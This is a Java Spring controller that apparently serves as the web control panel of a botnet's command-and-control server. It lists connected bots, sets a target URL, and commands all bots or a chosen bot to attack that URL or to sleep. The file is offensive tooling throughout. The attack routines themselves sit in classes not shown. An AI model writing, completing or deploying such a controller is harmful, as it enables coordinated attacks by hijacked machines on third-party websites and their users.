package com.edsolab.BotNet.controller;

import java.sql.SQLException;
import java.util.List;

import javax.validation.Valid;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import com.edsolab.BotNet.Server.KeyServer;
import com.edsolab.BotNet.model.Address;
import com.edsolab.BotNet.model.ClientChannel;
import com.edsolab.BotNet.service.ClientChannelService;

@Controller
public class API {

	@Autowired
	private ClientChannelService client;

	@GetMapping("/")
	public String index(Model model) {
		List<ClientChannel> channels = client.getAllClient();
		model.addAttribute("channels", channels);
		model.addAttribute("address", new Address());
		return "index";
	}

	@RequestMapping(value = "submit")
	public String submit(@Valid Address address, RedirectAttributes model) throws Exception {
		model.addFlashAttribute("success", "Address: " + address.getUrl());
		KeyServer.url = address.getUrl();
		return "redirect:/";
	}

	@RequestMapping(value = "/attackAll")
	public String attackAll(RedirectAttributes model) throws Exception {
		client.saveAllClient("Attack");
		model.addFlashAttribute("success", "All clients attack to: " + KeyServer.url);
		KeyServer.attackAll = true;
		return "redirect:/";
	}

	@RequestMapping(value = "/attackById")
	public String attackById(@RequestParam("id") String id, RedirectAttributes model) throws Exception {
		client.saveClientById("Attack", id);
		model.addFlashAttribute("success", "Attack to: " + KeyServer.url + " with id: " + id);
		KeyServer.attackById = true;
		KeyServer.id = id;
		return "redirect:/";
	}

	@RequestMapping(value = "/sleepAll")
	public String sleep(RedirectAttributes model) throws SQLException {
		client.saveAllClient("Sleep");
		model.addFlashAttribute("success", "Sleep all!!");
		KeyServer.sleepAll = true;
		return "redirect:/";
	}

	@RequestMapping(value = "/sleepById")
	public String sleepById(@RequestParam("id") String id, RedirectAttributes model) throws Exception {
		client.saveClientById("Sleep", id);
		model.addFlashAttribute("success", "Sleep with id: " + id);
		KeyServer.sleepById = true;
		KeyServer.id = id;
		return "redirect:/";
	}
}
